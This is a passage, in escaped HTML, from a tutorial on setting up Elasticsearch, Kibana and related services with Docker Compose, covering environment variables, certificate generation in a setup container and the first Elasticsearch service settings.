&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Version of Elastic products&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;STACK_VERSION&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;8.7.1
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Cluster name&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;CLUSTER_NAME&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;docker-cluster
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# set license to &amp;#39;basic&amp;#39; or &amp;#39;trial&amp;#39; for 30-day trial&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;LICENSE&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;basic
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Port to expose Elasticsearch HTTP API to the host&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ES_PORT&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;9200&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Port to expose Kibana to the host&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;KIBANA_PORT&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5601&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Available host memory for each service in bytes (1GB)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ES_MEM_LIMIT&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1073741824&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;KB_MEM_LIMIT&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1073741824&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;LS_MEM_LIMIT&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1073741824&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Sample predefined key only for testing environments&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ENCRYPTION_KEY&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;c34d38b3a14956121ff2170e5030b471551370178f43e5626eec58b04a30fae2&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Here, I configure all the necessary variables for elastic to work properly, like passwords, ports, memory limits and so on.&lt;/p&gt;
&lt;p&gt;All of the variables that can be configured can be found at &lt;a href=&#34;https://www.elastic.co/guide/en/fleet/current/agent-environment-variables.html&#34;&gt;Elastic docs&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&#34;base-setup&#34;&gt;
  Base Setup
  &lt;a href=&#34;#base-setup&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h3&gt;

&lt;h4 id=&#34;docker-composeyml-setup-container&#34;&gt;
  docker-compose.yml (&amp;lsquo;setup&amp;rsquo; container)
  &lt;a href=&#34;#docker-composeyml-setup-container&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h4&gt;
&lt;p&gt;&lt;em&gt;Note: From this point on, make sure syntax is correct in these configuration files. especially spelling and indentation. Otherwise docker will not setup the containers.&lt;/em&gt;&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;yml&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-yml&#34; data-lang=&#34;yml&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;version&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;3.8&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;// This is deprecated. you can just remove this line&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;volumes&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;certs&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;driver&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;local&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;esdata01&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;driver&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;local&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;kibanadata&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;driver&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;local&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;metricbeatdata01&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;driver&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;local&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;filebeatdata01&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;driver&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;local&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;logstashdata01&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;driver&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;local&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;networks&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;default&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#f92672&#34;&gt;name&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;elastic-network&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#f92672&#34;&gt;external&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;services&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;setup&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#f92672&#34;&gt;image&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;docker.elastic.co/elasticsearch/elasticsearch:${STACK_VERSION}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#f92672&#34;&gt;volumes&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     - &lt;span style=&#34;color:#ae81ff&#34;&gt;certs:/usr/share/elasticsearch/config/certs&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#f92672&#34;&gt;user&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;0&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#f92672&#34;&gt;command&lt;/span&gt;: &amp;gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;     bash -c &amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;       if [ x${ELASTIC_PASSWORD} == x ]; then
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;         echo &amp;#34;Set the ELASTIC_PASSWORD environment variable in the .env file&amp;#34;;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;         exit 1;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;       elif [ x${KIBANA_PASSWORD} == x ]; then
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;         echo &amp;#34;Set the KIBANA_PASSWORD environment variable in the .env file&amp;#34;;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;         exit 1;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;       fi;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;       if [ ! -f config/certs/ca.zip ]; then
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;         echo &amp;#34;Creating CA&amp;#34;;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;         bin/elasticsearch-certutil ca --silent --pem -out config/certs/ca.zip;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;         unzip config/certs/ca.zip -d config/certs;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;       fi;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;       if [ ! -f config/certs/certs.zip ]; then
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;         echo &amp;#34;Creating certs&amp;#34;;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;         echo -ne \
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;         &amp;#34;instances:\n&amp;#34;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;         &amp;#34;  - name: es01\n&amp;#34;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;         &amp;#34;    dns:\n&amp;#34;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;         &amp;#34;      - es01\n&amp;#34;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;         &amp;#34;      - localhost\n&amp;#34;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;         &amp;#34;    ip:\n&amp;#34;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;         &amp;#34;      - 127.0.0.1\n&amp;#34;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;         &amp;#34;  - name: kibana\n&amp;#34;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;         &amp;#34;    dns:\n&amp;#34;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;         &amp;#34;      - kibana\n&amp;#34;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;         &amp;#34;      - localhost\n&amp;#34;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;         &amp;#34;    ip:\n&amp;#34;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;         &amp;#34;      - 127.0.0.1\n&amp;#34;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;         &amp;gt; config/certs/instances.yml;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;         bin/elasticsearch-certutil cert --silent --pem -out config/certs/certs.zip --in config/certs/instances.yml --ca-cert config/certs/ca/ca.crt --ca-key config/certs/ca/ca.key;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;         unzip config/certs/certs.zip -d config/certs;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;       fi;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;       echo &amp;#34;Setting file permissions&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;       chown -R root:root config/certs;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;       find . -type d -exec chmod 750 \{\} \;;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;       find . -type f -exec chmod 640 \{\} \;;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;       echo &amp;#34;Waiting for Elasticsearch availability&amp;#34;;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;       until curl -s --cacert config/certs/ca/ca.crt https://es01:9200 | grep -q &amp;#34;missing authentication credentials&amp;#34;; do sleep 30; done;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;       echo &amp;#34;Setting kibana_system password&amp;#34;;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;       until curl -s -X POST --cacert config/certs/ca/ca.crt -u &amp;#34;elastic:${ELASTIC_PASSWORD}&amp;#34; -H &amp;#34;Content-Type: application/json&amp;#34; https://es01:9200/_security/user/kibana_system/_password -d &amp;#34;{\&amp;#34;password\&amp;#34;:\&amp;#34;${KIBANA_PASSWORD}\&amp;#34;}&amp;#34; | grep -q &amp;#34;^{}&amp;#34;; do sleep 10; done;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;       echo &amp;#34;All done!&amp;#34;;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;     &amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#f92672&#34;&gt;healthcheck&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     &lt;span style=&#34;color:#f92672&#34;&gt;test&lt;/span&gt;: [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;CMD-SHELL&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[ -f config/certs/es01/es01.crt ]&amp;#34;&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     &lt;span style=&#34;color:#f92672&#34;&gt;interval&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;1s&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     &lt;span style=&#34;color:#f92672&#34;&gt;timeout&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;5s&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     &lt;span style=&#34;color:#f92672&#34;&gt;retries&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;120&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;This is a base setup for docker compose where storage volume path, network and services are enabled and specified.&lt;/p&gt;

&lt;h3 id=&#34;elasticsearch&#34;&gt;
  Elasticsearch
  &lt;a href=&#34;#elasticsearch&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h3&gt;
&lt;p&gt;Here, I setup elasticsearch&lt;/p&gt;

&lt;h4 id=&#34;docker-composeyml&#34;&gt;
  docker-compose.yml
  &lt;a href=&#34;#docker-composeyml&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h4&gt;
&lt;p&gt;Add the following to &lt;code&gt;docker-compose.yml&lt;/code&gt;&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;yml&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-yml&#34; data-lang=&#34;yml&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;es01&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#f92672&#34;&gt;depends_on&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     &lt;span style=&#34;color:#f92672&#34;&gt;setup&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       &lt;span style=&#34;color:#f92672&#34;&gt;condition&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;service_healthy&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#f92672&#34;&gt;image&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;docker.elastic.co/elasticsearch/elasticsearch:${STACK_VERSION}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#f92672&#34;&gt;labels&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     &lt;span style=&#34;color:#f92672&#34;&gt;co.elastic.logs/module&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;elasticsearch&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#f92672&#34;&gt;volumes&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     - &lt;span style=&#34;color:#ae81ff&#34;&gt;certs:/usr/share/elasticsearch/config/certs&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     - &lt;span style=&#34;color:#ae81ff&#34;&gt;esdata01:/usr/share/elasticsearch/data&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#f92672&#34;&gt;ports&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     - &lt;span style=&#34;color:#ae81ff&#34;&gt;${ES_PORT}:9200&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#f92672&#34;&gt;environment&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     - &lt;span style=&#34;color:#ae81ff&#34;&gt;node.name=es01&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     - &lt;span style=&#34;color:#ae81ff&#34;&gt;cluster.name=${CLUSTER_NAME}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     - &lt;span style=&#34;color:#ae81ff&#34;&gt;discovery.type=single-node&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     - &lt;span style=&#34;color:#ae81ff&#34;&gt;ELASTIC_PASSWORD=${ELASTIC_PASSWORD}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     - &lt;span style=&#34;color:#ae81ff&#34;&gt;bootstrap.memory_lock=true&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     - &lt;span style=&#34;color:#ae81ff&#34;&gt;xpack.security.enabled=true&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     - &lt;span style=&#34;color:#ae81ff&#34;&gt;xpack.security.http.ssl.enabled=true&lt;/span&gt;
